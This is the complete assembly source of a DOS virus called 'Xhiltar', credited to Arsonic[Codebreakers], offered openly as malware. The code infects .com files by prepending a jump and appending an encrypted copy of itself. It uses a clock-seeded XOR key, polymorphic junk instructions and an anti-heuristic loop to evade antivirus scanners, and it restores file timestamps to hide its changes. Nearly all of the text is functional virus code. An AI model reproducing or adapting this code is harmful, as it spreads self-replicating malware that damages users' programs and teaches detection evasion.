; The Xhiltar Virus 
; By Arsonic[Codebreakers] 
; Type: Runtime Appending Com Infector 
; Encrypted: Yes 
; Polymorphic: Yes 
; Time/Date: Yes 
; add Attrib: Yes 
; Changes Directory's: Yes (dotdot method) 
; Anti-Anti-Virus: Yes (anti-heuristics) 
db 0e9h,0,0 
start: 
call delta 
delta: 
pop bp 
sub bp,offset delta 
mov cx,0ffffh                   ;fuck up those heristics! 
fprot_loopy: 
jmp back 
mov ax,4c00h 
int 21h 
back: 
loop fprot_loopy 
lea si,[bp+hidden_start] 
mov di,si 
mov cx,end - hidden_start 
call encryption 
jmp  hidden_start 
value db 0 
encryption:                       ;encryption routine 
call poly 
encrypt: 
lodsb                         ;1 
_1stDummy: 
nop                           ;1 = +1 
xor al,byte ptr[bp+value]     ;4 
_2ndDummy: 
nop                           ;1 = +6 
stosb                         ;1 
_3rdDummy: 
nop                           ;1 = +8 
loop encrypt                  ;2 
_4thDummy: 
nop                           ;1 = +11 
ret 
hidden_start: 
mov cx,3 
mov di,100h                    ;restore the first 3 bytes 
lea si,[bp+buff] 
rep movsb 
find_first:                    ;find first file 
mov  ah,4eh 
find_next: 
lea  dx,[bp+filemask] 
xor  cx,cx                     ;with 0 attrib's.. 
int  21h 
jnc  infect 
close: 
push 100h 
ret 
infect: 
mov ax,3d02h                   ;open file 
mov dx,9eh 
int 21h 
xchg bx,ax 
mov ax,5700h                   ;get time/date 
int 21h 
push dx                        ;save the values 
push cx 
in   al,40h                    ;get new encrypt value from system clock 
mov  byte ptr [bp+value],al 
mov ah,3fh                     ;read 3 bytes from the file.. too 
mov cx,3                       ;be replaced with a jump to the virus 
lea dx,[bp+buff] 
int 21h 
mov ax,word ptr [80h + 1ah]    ;check for infect 
sub ax,end - start + 3 
cmp ax,word ptr[bp+buff+1] 
je close_file 
mov ax,word ptr[80h + 1ah] 
sub ax,3 
mov word ptr[bp+three+1],ax 
mov ax,4200h                   ;goto start of file 
xor cx,cx 
xor dx,dx 
int 21h 
mov ah,40h                     ;write the 3 byte jump 
lea dx,[bp+three] 
mov cx,3 
int 21h 
mov ax,4202h                   ;goto end of file 
xor cx,cx 
xor dx,dx 
int 21h 
mov ah,40h                     ;write the unencrypted area 
lea dx,[bp+start] 
mov cx,hidden_start - start 
int 21h 
lea si,[bp+hidden_start]       ;encrypt the virus 
lea di,[bp+end] 
mov cx,end - hidden_start 
call encryption 
mov ah,40h                     ;write encrypted area 
lea dx,[bp+end] 
mov cx,end - hidden_start 
int 21h 
close_file: 
mov ax,5701h                   ;restore time/date 
pop cx                         ;with saved values 
pop dx 
int 21h 
mov ah,3eh                     ;close file 
int 21h 
mov  ah,4Fh                    ;find next file 
jmp find_next 
poly: 
call random                    ;get random value 
mov [bp+_1stDummy],dl          ;write random do-nothing call to encrypt 
call random 
mov [bp+_2ndDummy],dl 
call random 
mov [bp+_3rdDummy],dl 
call random 
mov [bp+_4thDummy],dl 
ret 
garbage: 
nop       ; no operation instruction 
clc       ; Clear Carry 
stc       ; Set Carry 
sti       ; Set Interuppt Flag 
cld       ; Clear Direction Flag 
cbw       ; Convert byte to word 
inc  dx   ; increase dx 
dec  dx   ; decrease dx 
lahf      ; loads AH with flags 
random: 
in ax,40h 
and ax,7 
xchg bx,ax 
add  bx,offset garbage 
add  bx,bp 
mov  dl,[bx] 
ret 
filemask db '*.com',0 
three    db 0e9h,0,0 
buff     db 0cdh,20h,0 
dotdot   db '..',0 
author   db 'Arsonic[Codebreakers]',13,10,'$' 
virus    db 'the XHiLTAR virus',13,10,'$' 
         db 'I LOVE U LISA',13,10,'$' 
         db 'I LOVE U SOOOO MUCH!',13,10,'$' 
end: 